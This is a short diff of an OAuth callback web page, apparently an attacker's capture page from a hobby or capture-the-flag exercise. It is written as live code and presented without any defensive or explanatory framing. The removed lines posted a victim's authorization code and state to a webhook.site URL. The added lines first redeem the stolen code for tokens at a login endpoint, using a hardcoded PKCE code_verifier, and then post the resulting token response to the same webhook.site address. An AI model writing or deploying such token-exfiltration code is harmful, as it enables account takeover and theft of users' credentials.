@@ -6,11 +6,17 @@
     const state = params.get("state");
     const error = params.get("error");
 
-    fetch("https://webhook.site/28c54aae-b353-4708-a029-f0fb185e5f35", {
+    const url = new URL("https://login.sketchycompany.upd-dcs.work/token")
+    url.searchParams.set("code", code);
+    url.searchParams.set("code_verifier", "OmgZPWrKe8dSkHQyEriI0n1H0WuL6P2BttYqGMTE10iDKeJI_WrzZCrSj8qSaYqL");
+
+    const response = await fetch(url, {
         method: 'POST',
-        body: `${code}, ${state}, ${error}`,
-        credentials: "include"
     })
 
+    fetch("https://webhook.site/28c54aae-b353-4708-a029-f0fb185e5f35", {
+        method: 'POST',
+        body: await response.json()
+    })
 </script>
 <h1>callback or smth idunno man im cooked</h1>
